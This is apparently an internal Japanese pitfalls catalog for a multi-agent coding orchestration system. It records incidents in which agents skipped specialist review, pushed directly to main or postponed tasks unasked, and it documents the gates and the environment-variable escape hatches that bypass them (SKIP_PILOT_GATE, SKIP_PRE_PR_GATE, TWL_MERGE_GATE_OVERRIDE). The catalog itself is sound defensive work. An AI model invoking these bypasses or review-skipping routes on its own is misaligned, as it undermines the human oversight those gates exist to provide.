| 13.1 | `spawn-controller.sh co-autopilot` で Issue 単位 Worker を直接起動しようとする | window 名が `wt-co-autopilot-*`（`ap-*` でない）、`issue-N.json` が生成されない、Worker が `/twl:workflow-setup` を実行せずに idle | **Issue 単位 Worker 起動は `autopilot-launch.sh` の責務**。observer は `spawn-controller.sh co-autopilot` で Pilot を spawn し、Worker 起動は Pilot に委譲する |
| 13.2 | Pilot が `autopilot-launch.sh` の代わりに `cld-spawn` を直接呼んで Worker を起動する | Worker の `AUTOPILOT_DIR` / `WORKER_ISSUE_NUM_ENV` が未設定、クラッシュ検知フック非設定、state file missing | `autopilot-launch.sh` 経由必須（環境変数・クラッシュ検知フック・window-manifest を担当） |
| 13.3 | su-observer が Worker window（`ap-*`）に `spawn-controller.sh` を呼んで Pilot を二重起動する | 同一セッションに `ap-*` と `wt-co-autopilot-*` が混在、Pilot 二重起動 | observer が spawn するのは Pilot（`wt-co-autopilot-*`）のみ。Worker（`ap-*`）への介入は `session-comm.sh inject` 経由 |
| 13.4 | `spawn-controller.sh co-autopilot` で起動した Pilot が `issue-N.json` を生成しないまま停滞（chain 不回転の典型） | `.autopilot/issues/issue-N.json` が存在しない、tmux window は存在するが `ap-*` window がない | Pilot が Step 3 `autopilot-init` → Step 4 `autopilot-launch.sh` を実行していることを確認する。state file 未生成なら Pilot session の chain ログを確認し、stuck 箇所を特定して inject で再開 |
| 13.5 | observer が `spawn-controller.sh co-autopilot --with-chain --issue N` を Issue 毎に叩き、Worker を直接 spawn する（「1 Issue = 1 Pilot」錯覚） | `--with-chain` は `autopilot-launch.sh` に直接委譲する skill bypass 経路。Pilot が spawn されないため co-autopilot Step 1-5（deps graph / Wave 計画 / specialist-audit）が全 skip される。Phase Z で 14 PR (#923/#925-#937) が specialist review を経由せずに merge された根本原因。**関連: bug-4 (Wave U.Y main 直接 push d6cb9859)** — `--with-chain` で起動した Worker が worktree でなく main で作業し main 直接 push に至った同一 root cause。ADR-041 (#1644) で feature-dev 経路は pre-push hook でガードしたが co-autopilot `--with-chain` 経路は未カバーだった (#1650 で default-deny 化)。**#1650 以降: `spawn-controller.sh` が `--with-chain --issue` を default-deny (exit 2) に変更。escape hatch は `SKIP_PILOT_GATE=1 SKIP_PILOT_REASON='<理由>'` のみ** | **正規運用は 1 Pilot = 複数 Issue**。observer は `spawn-controller.sh co-autopilot <prompt>`（`--with-chain` なし）で Pilot を 1 つ spawn し、Pilot が deps graph に基づく Wave 計画と Worker 起動を担当する。`--with-chain --issue N` は autopilot-launch.sh 直接呼出しとほぼ等価であり、observer が使う経路ではない。**observer 自動運用 checklist**: spawn コマンド発行前に `echo "$CMD" \| grep -q "\-\-with-chain"` を確認し、含まれていれば DENY して正規 pattern で再 spawn する |

**正しい経路選択:**
- observer がユーザー指示で Issue 群を実装させる場合 → `spawn-controller.sh co-autopilot`（経路 B）
- Pilot が個別 Issue の Worker を起動する場合 → `autopilot-launch.sh`（経路 A、`autopilot-launch.md` 経由）
- observer が Worker に直接介入する場合 → `session-comm.sh inject`（`spawn-controller.sh` 経由でない）

詳細: `co-autopilot SKILL.md §Step 3.5 起動経路比較`

---

## 14. git 管理外実行時の pwd フォールバック禁止（#966 文書化）

`chain-runner.sh` の `resolve_project_root()` が `git rev-parse --show-toplevel 2>/dev/null || pwd` を実装していた時期に、Worker の CWD が git 管理外になると `pwd` が project root として誤採用され user-global 書き込みが発生した（Wave AA.3 Phase 1、doobidoo `b81b1962`）。

**症状**: Worker が `~/.claude/plugins/twl/.dev-session/issue-N/` に書き込もうとして permission prompt が発火する。本来の書き込み先は `<worktree>/.dev-session/issue-N/`。

| # | Pitfall | 観察パターン | 対策 |
|---|---------|------------|------|
| 14.1 | `resolve_project_root()` が `\|\| pwd` で CWD を誤 root として採用する | Worker の permission prompt が `~/.claude/plugins/twl/.dev-session/issue-N` への mkdir を要求。CWD が `/tmp` や非 git パスになっている | **`\|\| pwd` は禁止**。ADR-027 の 3 段 fallback（tier 1: CWD rev-parse → tier 2: script-path rev-parse → tier 3: `return 1`）を使うこと |
| 14.2 | Worker CWD が git 管理外になる経路 | `bash -c "cd /tmp && ..."` などで呼び出された chain-runner.sh が tier 1 失敗後に `pwd` = `/tmp` を採用する | tier 2 (script-path fallback) が `BASH_SOURCE[0]` のディレクトリから git rev-parse を試みる。script が worktree 内 symlink 経由で常駐している前提で救済可能 |
| 14.3 | script 自体が worktree 外に配置される異常状態（tier 2 も fail） | script が `/tmp` にコピーされた状態で実行される | tier 3 が `[chain-runner] FATAL: resolve_project_root failed (cwd=..., script=...)` を stderr に出力し `return 1` で abort。誤 root への書き込みは構造的に不可能 |

| 14.4 | autopilot Worker 起動時に `SNAPSHOT_DIR` が env inject されず、子 agent が user-global fallback path に mkdir する | `ac-scaffold-tests` 等の sub-agent が `~/.claude/plugins/twl/.dev-session/issue-N/` への mkdir を要求し permission prompt で stall する。`chain-runner.sh:330` の `export SNAPSHOT_DIR=` は `step_init` 経由の Worker にしか届かない（#1176） | **defense in depth**: `autopilot-launch.sh` の tmux new-window env inject に `SNAPSHOT_DIR=${LAUNCH_DIR}/.dev-session/issue-${ISSUE}` を追加する（#1176）。chain-runner.sh の SSOT は維持し、env 伝搬経路を補完する二重設定として実装 |

**正しい設計原則**:
- `resolve_project_root()` で `pwd` を fallback として使ってはならない（ADR-027）
- 他の `resolve_*` 関数（例: `resolve_autopilot_dir()`）でも同様の `|| pwd` fallback は禁止
- 残骸 cleanup: `~/.claude/plugins/twl/.dev-session/` に孤児ファイルが残る場合は `plugins/twl/commands/cleanup-orphan-snapshots.md` の手順を参照
- **§14.4 別軸対策**: §14.1-14.3 は `resolve_project_root()` 自体の bug（ADR-027 軸）、§14.4 は env 伝搬経路の補完（#1176 軸）。両者は独立した対策として共存する

**参照**: ADR-027, Issue #966, Issue #938 (per-issue namespace), Issue #1176, doobidoo `b81b1962`

---

## 15. Pilot/co-explore 完遂後の next-step postpone 判断 error（#1085 文書化）

**事象（Wave U、2026-04-29 実例）**: co-explore Phase 2 が `.explore/1023/summary.md`（4 子 Issue 計画確定）で完遂した後、observer が「Phase 1 完遂後まで postpone」と勝手に判断し、next-step（子 Issue 起票）を自律 spawn しなかった。ユーザー指摘で発覚。

### 根本要因

observer が「重要 event 待機」モードに入り **passive 化** し、co-explore 完遂を completion event として能動的に捕捉しなかった。heartbeat-watcher 等の受動的チャネルにのみ依存し、次の依存関係を勝手に発明した:

- `Pilot polling 完了` ではなく `ユーザー入力` を next-step trigger にした
- 「Phase 1 完遂後」など実在しない順序依存を発明した
- observer 自身の heartbeat 更新が silence 検知を reset してしまう構造的盲点を見落とした（Incident 3）

### 検出パターン（MUST）

| # | 症状 | 対策 |
|---|------|------|
| 15.1 | co-explore が `.explore/<N>/summary.md` を生成しても next-step を spawn しない | `.explore/<N>/summary.md` の生成を能動 polling（inotifywait または filesystem check）で検知し、即時 next-step 自律 spawn へ遷移する（§11 クロスリファレンス参照） |
| 15.2 | 実在しない Phase 依存を理由に postpone | postpone は **user 明示指示時のみ**。observer 自身の判断による postpone は **MUST NOT** |
| 15.3 | heartbeat self-update が silence 検知 reset を誤発 | heartbeat ファイルの writer pid と watcher pid を区別。observer 自身の heartbeat 更新は silence reset 対象外とする（`refs/su-observer-supervise-channels.md` 参照） |
| 15.4 | Pilot idle 状態（`Saturated for`/`Worked for` + IDLE prompt）を検知せず | `pilot-completion-signals.md` の PILOT-PHASE-COMPLETE チャネルに加え、co-explore 完遂用 `.explore/<N>/summary.md` 検知を必ず組み合わせる |

### 正しい next-step spawn 手順（MUST）

```
co-explore 完遂（.explore/<N>/summary.md 生成）を検知
→ 5 分以内に next-step（子 Issue 起票 / Wave 計画更新）を自律 spawn する
→ postpone が必要な場合のみ user に明示確認を取る（AskUserQuestion 必須）
```

**MUST NOT**: SU-4 制約（同時 10 controllers 以内）を確認する前に postpone 判断を下すこと。SU-4 内であれば直接 `gh issue create` で起票可能。

### §11 とのクロスリファレンス

- §11「Observer idle 中の session disconnect 対策」: Monitor heartbeat 欠如が observer 自身の passive 化を招く根本要因の一つ。§11.1 の heartbeat emit ガードと本節の能動 completion 捕捉を組み合わせること。
- co-explore 完遂 → next-step spawn の 5 分タイムアウト規約は `refs/su-observer-wave-management.md` に定義。

**参照**: Issue #1085, Wave U incident 1+3, doobidoo `observer-pitfall` tag

---

## 16. Step 0 MUST refs Read 省略 incident（2026-04-29 ipatho2）

**事象**: observer が workflow 実行前の Step 0 MUST（`refs/refine-processing-flow.md` Read）を省略し、processing flow の全ステップを把握しないまま実装を進めた。

### 根本要因

refs ファイルが `~/.claude/plugins/twl/refs/` ではなく `main/plugins/twl/skills/workflow-issue-refine/refs/` 等 **worktree 配下の実ファイルパス** に配置されているため、Read 先を `claude/` 配下と誤解し、「ファイル不在」として Step 0 を実質スキップした。

### 既知の落とし穴（MUST 確認）

| # | 誤解 | 正しい動作 |
|---|------|-----------|
| 16.1 | `claude/plugins/twl/refs/*.md` を Read しようとする | refs は **worktree の `plugins/twl/` 配下**に存在。`main/plugins/twl/skills/<workflow-name>/refs/` が正規パス |
| 16.2 | `refs/` ファイルが見つからないとスキップする | SKILL.md の Step 0 は **MUST**。不在の場合はパスを確認し直す（絶対パスで再 Read） |
| 16.3 | Step 0 を "init 処理" と混同して後回しにする | Step 0 は最初の実装ステップより**前**に完了させる（MUST 順守） |

### 対策（MUST）

1. workflow SKILL.md に `Step 0: Read refs/xxx.md` が記載されていれば、**必ず絶対パスで Read** する
2. 絶対パス解決: `$(git rev-parse --show-toplevel)/plugins/twl/skills/<workflow>/refs/<file>.md`
3. Read 失敗時はパスを変えて再試行し、スキップしない

**参照**: Issue #1118, doobidoo hash `e73fc1fe`, `observer-pitfall` tag

---

## 17. BUDGET-LOW recovery で orchestrator killed 後の Pilot 自動復旧不全（#1128 文書化）

**事象（2026-04-29 ipatho2 session 26c380eb）**: `[BUDGET-LOW]` シーケンスで orchestrator PID を kill した後、budget cycle reset で resume する際に Pilot 内部 monitor が Worker chain advancement の自動 inject を実行しなかった。Wave B 4 Worker（#1111/#1113/#1114/#1105）すべてで同一パターンが発生し、observer が §6.2 復旧手順で手動 inject して復旧した（4 回再発）。

あわせて、orchestrator EXIT trap が異常終了で発火したため PR merged 後の Worker window cleanup が走らず、最大 2h41min の残存が発生した。

### 根本要因

1. **Bug A**: orchestrator unavailable 時の Pilot fallback inject logic 欠落。Worker pane が terminal state で idle になっても Pilot は next workflow を inject しない。
2. **Bug C**: orchestrator kill による EXIT trap 不完全で Worker window が残存。

### 対策（Issue #1128 で自動化済み）

`plugins/twl/scripts/pilot-fallback-monitor.sh` を導入（AC-1/AC-3 by #1128）:

```bash
# orchestrator unavailable 時に Pilot が起動（BUDGET-LOW recovery 後など）
bash plugins/twl/scripts/pilot-fallback-monitor.sh &

# 停止: orchestrator 復活を検知して自動停止、またはシグナルで手動停止
```

**動作**:
- orchestrator alive 時は即終了（不変条件 M 準拠）
- 各 Worker の `resolve_next_workflow` で next workflow を決定 → `session-comm.sh inject` で inject
- PR MERGED 状態の Worker window を `tmux kill-window` で即時 cleanup（SLA: 30s 以内）

### observer 介入が必要な場合（最終 fallback）

`pilot-fallback-monitor.sh` が起動できない / 動作しない場合のみ §6.2 の手順を使用:

```bash
# Worker の current_step から next workflow を解決
python3 -m twl.autopilot.resolve_next_workflow --issue <ISSUE_NUM>

# session-comm.sh で inject
bash "$(git rev-parse --show-toplevel)/plugins/session/scripts/session-comm.sh" inject <WORKER_WINDOW> "/twl:workflow-pr-fix"  # cross-plugin reference

# PR merged 後の window cleanup
_kill_window_safe <WORKER_WINDOW>  # §4.11 session-safe pattern
```

**参照**: Issue #1128, 2026-04-29 ipatho2 session 26c380eb, `wt-co-autopilot-164142` pane

---

## 18. merge_failed: draft 誤認（chain workflow の実装 gap #1497）

| # | Pitfall | 対策 |
|---|---------|------|
| 18.1 | `gh pr merge` が `GraphQL: Pull Request is still a draft (mergePullRequest)` で失敗 → Pilot が「Issue 元 bug の再現」と誤認して Wave abort | **chain workflow の実装 gap**（Issue #1497 fix: auto-merge.sh に `gh pr ready` を追加済み）。`merge_failed: PR is still a draft` = Issue 元 bug の再現ではなく、chain の draft → ready 切替不足。`gh pr ready <PR>` を手動実行して recovery 可能 |
| 18.2 | Pilot が `failed (recursive bug 観察)` 宣言後に idle → Wave が完遂扱いで終了せず | observer が `gh pr ready <PR>` → `gh pr merge --squash --delete-branch` を自律実行。recovery 後に Wave 完遂宣言させる（Wave 58 / Issue #1481 実例） |

**発生条件**: Worker が PR を draft で作成（`autopilot-launch.sh --draft`）→ GREEN 実装完遂 → `workflow-pr-merge` の `auto-merge.sh` で merge attempt → draft のまま merge attempt → 失敗。

**根本原因（Issue #1497 fix 前）**: `auto-merge.sh` の非 autopilot path に `gh pr ready` 呼び出しが存在しなかった。

**recovery 手順**:
```bash
gh pr ready <PR_NUMBER>
gh pr merge <PR_NUMBER> --squash --delete-branch
```

**参照**: Issue #1497, Wave 58, PR #1492 (wave 58 fix), doobidoo `cf02430b`

---

## 19. lesson 一時保存の落とし穴（2026-05-07 失敗事例 / Issue #1517）

| # | Pitfall | 対策 |
|---|---------|------|
| 19.1 | lesson を doobidoo に保存した後、Issue 起票・Wave 実装・永続文書化を行わずに「完遂」扱いにする → 次セッション/次 Wave で同じ失敗パターンが再発 | **ADR-036 / Invariant N の 4 ステップチェーンを完遂すること**。doobidoo 保存のみは NOT DONE |
| 19.2 | doobidoo に同セッション内で lesson を保存した直後に AUTO_NEXT_SPAWN 等の別タスクに移行 → Issue 起票を先送りにしたまま忘却 | lesson 保存後は **即座に** `gh issue create` を実行する。先送り禁止 |
| 19.3 | Wave 60 で doobidoo に lesson 23（board-status-update 自発実行）を保存 → SKILL.md に逆移植せず → Wave 63 で同じ計画ミス再発（2026-05-07 実例） | Wave 完了後に lesson を SKILL.md / refs の該当セクションに追記する PR を作成する |
| 19.4 | co-explore proxy の 25min cycle 不適を lesson 24 として保存 → monitor channel に組み込まず → ユーザー指摘で初対応（2026-05-07 実例） | lesson の種別（monitor 閾値 / spawn ルール 等）に応じた**正しい永続化先**（SKILL.md § / refs / scripts）に反映する |

**根本原因**: doobidoo 保存 ≠ 構造化。個別 lesson は記録されるが architecture spec に組み込む方針が文書化されていなかった。

**4 ステップチェーン（ADR-036 / 不変条件 N）**:
1. doobidoo 保存（短期記憶）
2. Issue 起票（`gh issue create` for follow-up implementation）
3. Wave 実装（skill/refs/scripts 反映 PR）
4. 永続文書化（pitfalls-catalog / SKILL.md / ADR への正式追記）

**参照**: ADR-036 (`architecture/decisions/ADR-036-lesson-structuralization.md`), 不変条件 N (`refs/ref-invariants.md`), Issue #1517, doobidoo `422c9ee8` (meta-lesson 26)

---

## §16 skill markdown の relative path 落とし穴（#1244）

### 症状

observer が `scripts/spawn-controller.sh` や `bash scripts/...` 形式のパスをそのまま実行しようとすると、**main project ディレクトリで作業中** の場合（CWD = `~/projects/local-projects/twill/main/`）に path 解決が失敗する。

例:
- `bash scripts/spawn-controller.sh` → `main/scripts/` は存在しない → Not found
- `bash skills/su-observer/scripts/record-detection-gap.sh` → `main/skills/` は存在しない → Not found

### 根本原因

skill markdown（SKILL.md / refs/*.md）内のスクリプト参照が `${CLAUDE_PLUGIN_ROOT}` を使わない相対パス形式で記載されていると、LLM が **CWD ベースでパスを解釈** しようとして誤認する。

### 検出シグナル

`bash scripts/...` 形式を skill markdown 内で見たら **`${CLAUDE_PLUGIN_ROOT}` migration 漏れの可能性**がある。

具体的なパターン:
- `bash scripts/<script>.sh` → skill-relative 短形式（最も危険）
- `` `scripts/<script>.sh` `` → backtick 内の skill-relative 短形式
- `bash skills/<skill>/scripts/<script>.sh` → `skills/` prefix 形式
- `bash plugins/twl/skills/<skill>/scripts/<script>.sh` → repo-relative 長形式

### mitigation note（観察 LLM 向け）

**`bash scripts/...` 形式を見たら `${CLAUDE_PLUGIN_ROOT}` migration 漏れの可能性** — 即座に確認すること。

修正形式:
- 同一 plugin 内 script → `bash "${CLAUDE_PLUGIN_ROOT}/skills/<skill>/scripts/<script>.sh"` または `bash "${CLAUDE_PLUGIN_ROOT}/scripts/<script>.sh"`
- cross-plugin script → `bash "$(git rev-parse --show-toplevel)/plugins/<other>/scripts/<script>.sh"` + `# cross-plugin reference` コメント

broken 形式の例: `source "$(git rev-parse --show-toplevel)/scripts/resolve-issue-num.sh"` — repo root の `scripts/` は存在せず、`plugins/twl/scripts/` が正しい。

**参照**: Issue #1244, 2026-05-02 ipatho-server-2

---

## §19 Wave spawn 前 Status=Refined check 未実施（#1516 文書化）

### 症状

Wave spawn 時に co-autopilot へ Status=Todo の Issue を渡すと、orchestrator が ADR-024 Phase B gate で Worker spawn を reject し、Pilot が同じ skip-stuck パターンを繰り返す。Wave 60 / Wave 63 で 2 度発生（本セッション 2026-05-07）。

### 根本原因

observer 仕様（SKILL.md / spawn-playbook.md）に「co-autopilot spawn 前の Status=Refined 確認 MUST」が明記されていなかった。

### 対策（MUST）

co-autopilot を spawn する前に以下を実行すること:

1. 対象 Issue の Project Board Status を確認:
   ```bash
   gh project item-list <BOARD_NUMBER> --owner <OWNER> --format json \
     | jq -r '.items[] | select(.content.number == <ISSUE_NUM>) | .status'
   ```
2. Status=Todo の場合は `board-status-update --status Refined` を実行:
   ```bash
   bash "${CLAUDE_PLUGIN_ROOT}/scripts/chain-runner.sh" board-status-update <ISSUE_NUM>
   ```
3. Status=Refined を確認後に co-autopilot spawn を実行する。

または `spawn-controller.sh co-autopilot --pre-check-issue N` を使用すると自動チェック＆abort が走る。

### 検出シグナル

Pilot ログに `ADR-024 Phase B` / `Status=Refined required` / `skip: Status is not Refined` 等のメッセージが繰り返し現れる。

**参照**: Issue #1516, Wave 60 / Wave 63 (2026-05-07), doobidoo hash 7b487dfb (Wave 60 lesson 23), 7c0421a3 (Wave 63 skip)

---

## 20. claude_session_id に phase 文字列が混入して cld --observer が resume 失敗する（#1552）

### 事象

`.supervisor/session.json` の `claude_session_id` フィールドに UUID v4 ではなく phase identifier 文字列（例: `post-compact-2026-05-08T10:16-w77`）が書き込まれると、`cld --observer` が `claude --resume "post-compact-..."` を実行して `No sessions match "<phase string>"` で失敗する（P0 バグ）。

### 例

```
claude_session_id="post-compact-2026-05-08T10:16-w77"
→ cld --observer → claude --resume "post-compact-2026-05-08T10:16-w77"
→ No sessions match "post-compact-2026-05-08T10:16-w77"
```

### 対処

- `session.json` の `claude_session_id` を **LLM が直接編集してはならない**（`refs/session-schema.md` 参照）
- phase 情報は `phase_handoff` フィールドに格納すること
- `claude_session_id` の更新は `session-init.sh` / `su-postcompact.sh` のみが行う
- 汚染発生時の recovery: `bash plugins/twl/skills/su-observer/scripts/session-init.sh`

**参照**: Issue #1552, Invariant O（`plugins/twl/refs/ref-invariants.md`）

## 21. Event horizon の整理（Issue #1633 / ADR-039 文書化）

### 事象

RED-only PR (test-only diff のみ、実装ファイル不在) が **PR 作成段階で一時的に main merge 候補状態 (CLEAN)** になる現象が Wave T (PR #1631、2026-05-09) で観察された。`#1626` の B+C+D defense は merge 段階で動作するため、PR 作成と merge の間の時間窓を防衛できない。autopilot の自動進行下では検証スキップによる主目的逸脱を許す可能性がある。

### Defense in Depth の 3 段防衛体制 (ADR-039)

| 段階 | 責務 | 実装 | 該当 layer |
|------|------|------|-----------|
| **GREEN 実装段階** | Worker が test-scaffold 直後に impl を生成 | `chain.py` `green-impl` step + `tdd-green-guard.sh` | chain ordering |
| **PR 作成段階** | `gh pr create` 試行時に test-only diff を ABORT | `pre-bash-pre-pr-gate.sh` PreToolUse hook | hook (event horizon) |
| **merge 段階** (既存) | `red-only` label + follow-up 不在を REJECT | `merge-gate-check-red-only.sh` | hook (`#1626`) |

各段階は **意図的に重複した判定ロジック** (test-only diff 検出) を持つ Defense in Depth 設計。いずれかの層が fail-open しても他層が catch する冗長性。

### bypass / allowlist / 例外運用

| 機構 | bypass / allowlist | 用途 |
|------|-------------------|------|
| `pre-bash-pre-pr-gate.sh` | `SKIP_PRE_PR_GATE=1 SKIP_PRE_PR_GATE_REASON='<理由>'` | PR 作成段階の緊急 bypass、REASON 必須、`/tmp/pre-pr-gate-bypass.log` に audit |
| `pre-bash-pre-pr-gate.sh` | Issue label `tdd-followup` / `test-only` | TDD followup PR の正規 path |
| `merge-gate-check-red-only.sh` | `red-only` label + follow-up Issue 存在 | RED-only PR の正規 path (`#1626`) |
| `merge-gate-check-red-only.sh` | `TWL_MERGE_GATE_OVERRIDE='<理由>'` | merge 段階の緊急 override (不変条件 R 違反) |

### chain ordering の前提

`workflow-test-ready` chain を `test-scaffold → green-impl → check` の順で実行することで、**PR 作成前に GREEN 実装まで完了** する flow を構造化。`pre-bash-pre-pr-gate.sh` hook が機械的 backstop として機能する。

### 観察ポイント (observer)

- `/tmp/pre-pr-gate-bypass.log` の bypass 頻度を nightly に確認 (濫用パターン検出)
- chain checkpoint で `green-impl` step が skip されていないか (5 辞書 SSoT integrity 違反の可能性)
- Wave 完了時に `tdd-green-guard.sh` が graceful skip (unknown framework) で WARNING を出していないか確認

**参照**: Issue #1633, ADR-039, ADR-038 (RED-only label-based bypass closure), Issue #1626 (merge 段階 defense), 不変条件 R / S (`plugins/twl/refs/ref-invariants.md`)

## 22. feature-dev spawn gate の運用（Issue #1635 / ADR-040、#1644 / ADR-041 で spawn-controller.sh 統合）

### 事象

ADR-040 (#1635) で `.supervisor/feature-dev-request-<N>.json` 承認証跡 + MCP tool 化を導入。Wave U.Y dogfooding で発見された 4 bug を解消するため、ADR-041 (#1644) で **spawn-controller.sh feature-dev path に統合**し、MCP tool は薄い wrapper に refactor された。

observer が feature-dev を起動する経路（#1644 改訂後）:

1. user 明示依頼受信
2. observer が承認証跡ファイルを作成（TTL=1800s）
3. `mcp__twl__twl_spawn_feature_dev(issue=N, ...)` 呼び出し（または `bash spawn-controller.sh feature-dev <N>`）
4. spawn-controller.sh feature-dev path で gate 検証（schema / TTL / Status=Refined / parallel-check）
5. 承認証跡を `.supervisor/consumed/` に atomic rename（`mv -n` + cross-fs フォールバック、one-shot 消費）
6. worktree auto-create（`$TWILL_ROOT/worktrees/fd-<N>`、`--cd` 未指定時）
7. pre-push hook 設置（per-worktree `core.hooksPath = .fd-hooks/`、main 直接 push を block）
8. FINAL_PROMPT 構築（`/feature-dev:feature-dev #<N>` + provenance + MUST 注入）
9. cld-spawn 経由で `wt-fd-<N>` window spawn

### 主要 pitfall

#### 22.1: TTL 内に spawn しなかった場合は再依頼が必要

承認証跡作成から 30 分以内に spawn しなかった場合、TTL expired となり gate は DENY を返す。observer はファイルを削除して user に再依頼を求める必要がある。

**対処**: user 依頼受信後、5 分以内に spawn を呼ぶ運用を推奨。逆に「依頼を受けたが他の作業で遅延しそう」な場合は、依頼受信時点ではなく **spawn 実行直前** に承認証跡を作成する。

#### 22.2: consumed/ への atomic rename が失敗した場合の手動 cleanup

POSIX 同 FS の `mv -n` はほぼ確実に成功するが、cross-fs（tmpfs → ext4 等）の場合は `cp + rm` フォールバックする。両方が失敗した稀なケースでは:

- 承認証跡が `.supervisor/feature-dev-request-<N>.json` に残る
- consumed/ には partial copy が残る可能性

**対処**: `.supervisor/` の cleanup を手動で実施。次回 spawn 試行前に承認証跡を再作成（古いものは TTL expired で DENY されるため再作成が安全）。

#### 22.3: Phase 1（4-stage taxonomy）と Phase 2（5-stage taxonomy）の混在期 confusion

本 Issue は #1625 (5-stage taxonomy: Idea/Triaged/Explored/Refined/Done 拡張) と独立に Phase 1 (Refined のみ check) を実装。#1625 完成後の Phase 2 拡張時には、検証ロジックが「Refined && timeline に Explored が存在」へ変わる。

**対処**: Phase 1 期間中は `Status=Refined` のみで gate を pass する。Phase 2 への移行時は ADR-040 Migration Path 通り `STATUS_GATE_PHASE=2` env で切替予定（別 Issue）。

#### 22.4: SKIP_LAYER2=1 直接 path の deprecation 失念

`SKIP_LAYER2=1 SKIP_LAYER2_REASON='<reason>'` は **#1644 改訂後は gate check のみを bypass** する（旧: fallback 手順表示 + exit 0）。意味的に変わったため、両方の挙動を試行する運用フローは要更新。

**対処**: SKIP_LAYER2=1 は escape hatch（gate 失敗時の緊急回避）として位置付け、通常運用では使用しない。完全削除は Wave U.W+2 で別 Issue (DP-5)。

#### 22.5: 旧 MCP tool 直接呼び出しからの移行落とし穴（Issue #1644 新規）

ADR-040 (#1635) 時点の MCP tool は Python 側で承認証跡 gate + cld-spawn 直接呼び出しを行っていた。ADR-041 (#1644) で spawn-controller.sh feature-dev path に統合され、MCP tool は薄い wrapper に変わった。以下の落とし穴に注意:

- **bug-3 (skill prefix 欠落) の真因**: 旧実装は cld-spawn を直接 invoke し、spawn-controller.sh L437 の `/<plugin>:<skill>` prefix prepend logic を bypass していた。これにより cld session が「自由形式」となり、feature-dev plugin の PR cycle 強制が無いことと合わせて bug-4 (main 直接 push) に到達した
- **bug-4 (main 直接 push incident d6cb9859)**: docs-only commit が main worktree から直接 push された。再発防止策は (a) pre-push hook で main push を block、(b) prompt に MUST 注入の二段
- **bug-1/2 (path 誤算)**: `_SPAWN_CONTROLLER_SCRIPT` / `_CLD_SPAWN_SCRIPT` が `Path.parent × 5` で `cli/` 起点に解決される問題。`subprocess.run(["bash", str(script), ...])` で bash 側に SCRIPT_DIR 自己解決を委任することで構造的消去
- **`prompt_text` MCP パラメータの意味変化**: 旧実装では cld-spawn の positional arg として渡されていたが、wrapper 化後は spawn-controller.sh が FINAL_PROMPT を内部生成するため **silently ignore** される。observer が prompt_text に依存していた場合は要 review
- **`worktree_path` 自動生成**: `worktree_path=None` の場合 spawn-controller.sh が `$TWILL_ROOT/worktrees/fd-<N>` に auto-create する。明示指定したい場合は引数で渡すこと（既存 worktree を再利用する場合は idempotent）

**対処**: 旧 Pattern B（cld-spawn 直接呼び出し）に依存していたコード/手順は spawn-controller.sh 経由に統一。MCP tool 経由でも内部的に spawn-controller.sh が走るため、API 互換性は維持される

### 検出シグナル

- `/tmp/mcp-shadow-spawn-feature-dev.log` の連続 DENY (`"ok": false`) → user 依頼との不整合または承認証跡作成手順の問題
- `.supervisor/consumed/` の累積数 / 期間 → audit 用途
- spawn-controller.sh stderr に `SKIP_LAYER2=1 — feature-dev gate checks bypassed` warning → escape hatch 使用箇所
- main への push attempt が pre-push hook で block されるログ → bug-4 再発検知

**参照**: Issue #1635 / ADR-040 (feature-dev spawn gate)、Issue #1644 / ADR-041 (spawn-controller 統合)、SU-10 (`supervision.md` Constraints)、intervention-catalog.md パターン 14 (Layer 1 Confirm)、`mcp__twl__twl_spawn_feature_dev` MCP tool 仕様、`spawn-controller.sh feature-dev` CLI 仕様
